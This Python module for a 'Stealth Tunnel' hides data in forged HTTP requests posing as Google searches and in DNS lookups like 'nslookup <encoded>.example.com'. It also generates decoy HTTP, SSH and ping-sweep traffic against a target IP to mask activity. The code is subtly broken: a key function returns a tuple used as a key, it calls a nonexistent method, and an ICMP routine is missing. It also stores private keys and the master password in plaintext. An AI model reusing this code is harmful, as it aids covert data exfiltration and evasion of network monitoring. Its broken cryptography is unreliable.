#!/usr/bin/env python3
"""
Cryptographic module for the Stealth Tunnel
Supports AES-256, ChaCha20, and steganography
"""

import os
import json
import base64
import hashlib
import hmac
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
import struct
import time
import random
import string

class CryptoManager:
    def __init__(self, master_password=None, key_file=None):
        self.master_password = master_password or self.generate_password()
        self.key_file = key_file or "tunnel.key"
        self.session_keys = {}
        self.backend = default_backend()
        self.setup_keys()
        
    def generate_password(self, length=32):
        """Generating a random password"""
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return ''.join(random.choice(chars) for _ in range(length))
        
    def setup_keys(self):
        """Configuring Cryptographic Keys"""
        if os.path.exists(self.key_file):
            self.load_keys()
        else:
            self.generate_keys()
            self.save_keys()
            
    def generate_keys(self):
        """Generating RSA keys and a master key"""
        print("[+] Generation of cryptographic keys...")
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=self.backend
        )
        self.public_key = self.private_key.public_key()
        self.master_key = self.derive_key(self.master_password.encode())
        
    def derive_key(self, password, salt=None):
        """Key derivation from password"""
        if salt is None:
            salt = os.urandom(16)
            
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=self.backend
        )
        return kdf.finalize(password), salt
        
    def save_keys(self):
        """Saving keys to a file"""
        private_pem = self.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        public_pem = self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        key_data = {
            'private_key': base64.b64encode(private_pem).decode(),
            'public_key': base64.b64encode(public_pem).decode(),
            'master_password': self.master_password
        }
        
        with open(self.key_file, 'w') as f:
            json.dump(key_data, f, indent=2)
            
        print(f"[+] The keys are saved in {self.key_file}")
        
    def load_keys(self):
        """Downloading keys from a file"""
        with open(self.key_file, 'r') as f:
            key_data = json.load(f)
            
        private_pem = base64.b64decode(key_data['private_key'])
        self.private_key = serialization.load_pem_private_key(
            private_pem, password=None, backend=self.backend
        )
        
        public_pem = base64.b64decode(key_data['public_key'])
        self.public_key = serialization.load_pem_public_key(
            public_pem, backend=self.backend
        )
        
        self.master_password = key_data['master_password']
        self.master_key = self.derive_key(self.master_password.encode())[0]
        
    def encrypt_aes(self, data, key=None):
        """AES-256-GSM encryption"""
        if key is None:
            key = self.master_key

        iv = os.urandom(16)
        
        cipher = Cipher(
            algorithms.AES(key),
            modes.GCM(iv),
            backend=self.backend
        )
        
        encryptor = cipher.encryptor()
        ciphertext = encryptor.finalize_with_tag(
            encryptor.update(data) + encryptor.finalize()
        )
        
        return iv + ciphertext[0] + ciphertext[1]
        
    def decrypt_aes(self, encrypted_data, key=None):
        """AES-256-GCM decryption"""
        if key is None:
            key = self.master_key
            
        iv = encrypted_data[:16]
        tag = encrypted_data[-16:]
        ciphertext = encrypted_data[16:-16]
        
        cipher = Cipher(
            algorithms.AES(key),
            modes.GCM(iv, tag),
            backend=self.backend
        )
        
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext) + decryptor.finalize()
        
    def encrypt_chacha20(self, data, key=None):
        """ChaCha20 encryption"""
        if key is None:
            key = self.master_key
            
        nonce = os.urandom(16)
        
        cipher = Cipher(
            algorithms.ChaCha20(key, nonce),
            mode=None,
            backend=self.backend
        )
        
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(data) + encryptor.finalize()
        
        return nonce + ciphertext
        
    def decrypt_chacha20(self, encrypted_data, key=None):
        """ChaCha20 decryption"""
        if key is None:
            key = self.master_key
            
        nonce = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        
        cipher = Cipher(
            algorithms.ChaCha20(key, nonce),
            mode=None,
            backend=self.backend
        )
        
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext) + decryptor.finalize()
        
    def create_steganographic_packet(self, data, cover_protocol="http"):
        """Steganography - hiding data in legitimate traffic"""
        
        if cover_protocol == "http":
            return self.hide_in_http(data)
        elif cover_protocol == "dns":
            return self.hide_in_dns(data)
        elif cover_protocol == "icmp":
            return self.hide_in_icmp(data)
        else:
            return data
            
    def hide_in_http(self, data):
        """Hiding data in HTTP headers"""
        encoded = base64.b64encode(data).decode()
        fake_headers = [
            f"GET /search?q={encoded[:20]} HTTP/1.1",
            f"Host: www.google.com",
            f"User-Agent: Mozilla/5.0 (compatible; {encoded[20:40]})",
            f"Accept: text/html,application/xhtml+xml",
            f"Accept-Language: en-US,en;q=0.9",
            f"Accept-Encoding: gzip, deflate",
            f"Cookie: session={encoded[40:]}",
            f"Connection: close",
            "",
            ""
        ]
        
        return "\r\n".join(fake_headers).encode()
        
    def hide_in_dns(self, data):
        """Hiding data in DNS queries"""
        encoded = base64.b64encode(data).decode().replace('=', '')
        labels = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        fake_domain = ".".join(labels) + ".example.com"
        
        return f"nslookup {fake_domain}".encode()
        
    def extract_from_http(self, http_data):
        """Extracting data from HTTP"""
        try:
            headers = http_data.decode().split('\r\n')
            data_parts = []
            
            for header in headers:
                if header.startswith('GET /search?q='):
                    data_parts.append(header.split('q=')[1].split(' ')[0])
                elif 'User-Agent:' in header:
                    ua_part = header.split('compatible; ')[1].split(')')[0]
                    data_parts.append(ua_part)
                elif 'Cookie: session=' in header:
                    cookie_part = header.split('session=')[1]
                    data_parts.append(cookie_part)
                    
            combined = ''.join(data_parts)
            return base64.b64decode(combined)
            
        except:
            return None

class TrafficObfuscator:
    def __init__(self):
        self.patterns = []
        
    def add_noise_traffic(self, target_ip, duration=300):
        """Adding noise traffic for masking"""
        import threading
        
        def generate_noise():
            patterns = [
                self.fake_http_requests,
                self.fake_dns_queries,
                self.fake_ssh_attempts,
                self.fake_ping_sweeps
            ]
            
            end_time = time.time() + duration
            while time.time() < end_time:
                pattern = random.choice(patterns)
                pattern(target_ip)
                time.sleep(random.uniform(1, 10))
                
        threading.Thread(target=generate_noise, daemon=True).start()
        print(f"[+] Noise traffic is active for {duration} seconds")
        
    def fake_http_requests(self, target_ip):
        """Fake HTTP requests"""
        import socket
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, 80))
            
            fake_requests = [
                f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n",
                f"GET /robots.txt HTTP/1.1\r\nHost: {target_ip}\r\n\r\n",
                f"GET /favicon.ico HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            ]
            
            request = random.choice(fake_requests)
            s.send(request.encode())
            s.recv(1024)
            s.close()
            
        except:
            pass
            
    def fake_dns_queries(self, target_ip):
        """Fake DNS requests"""
        import subprocess
        
        fake_domains = [
            "google.com", "facebook.com", "amazon.com",
            "microsoft.com", "apple.com", "netflix.com"
        ]
        
        domain = random.choice(fake_domains)
        try:
            subprocess.run(f"nslookup {domain} {target_ip}", 
                         shell=True, capture_output=True, timeout=5)
        except:
            pass
            
    def fake_ssh_attempts(self, target_ip):
        """Fake SSH connection attempts"""
        import socket
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, 22))
            s.recv(1024)
            s.close()
        except:
            pass
            
    def fake_ping_sweeps(self, target_ip):
        """Fake ping scans"""
        import subprocess
        
        ip_parts = target_ip.split('.')
        fake_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{random.randint(1, 254)}"
        
        try:
            subprocess.run(f"ping -c 1 -W 1 {fake_ip}", 
                         shell=True, capture_output=True, timeout=3)
        except:
            pass
